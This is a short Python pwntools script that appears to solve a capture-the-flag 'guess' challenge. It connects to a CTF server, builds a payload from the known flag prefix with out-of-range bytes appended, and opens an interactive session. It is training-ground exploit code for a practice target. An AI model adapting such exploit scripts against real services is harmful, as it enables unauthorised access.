#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
from libnum import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

io = remote('pwn.jarvisoj.com', 9878)
io.recvuntil('guess> ')
flag = 'PCTF{'
payload = hex(s2n(flag))[2:]
word = '0123456789abcdef'
# len of all the flag is 50
# the content is 44
for i in range(44):
    payload += '0'
    payload += chr(197+i)



payload += hex(s2n('}'))[2:]
io.sendline(payload)
io.recv()
io.interactive()

